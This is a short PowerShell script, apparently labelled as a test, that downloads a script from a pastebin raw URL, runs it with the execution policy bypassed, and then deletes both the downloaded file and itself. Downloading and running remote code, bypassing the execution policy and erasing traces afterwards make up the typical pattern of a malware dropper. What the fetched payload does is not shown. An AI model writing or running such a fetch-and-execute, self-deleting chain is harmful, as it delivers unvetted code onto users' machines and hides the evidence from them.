$fileLocation = "D:\Downloads\dlTest\test.ps1"

irm "https://pastebin.com/raw/hxq7T8rk" | Out-File $fileLocation -Force

# run test.ps1 with parameter -function "test"
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$fileLocation`" -function test" -Wait

# delete the test.ps1 file
Remove-Item -Path $fileLocation -Force

# delete itself
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
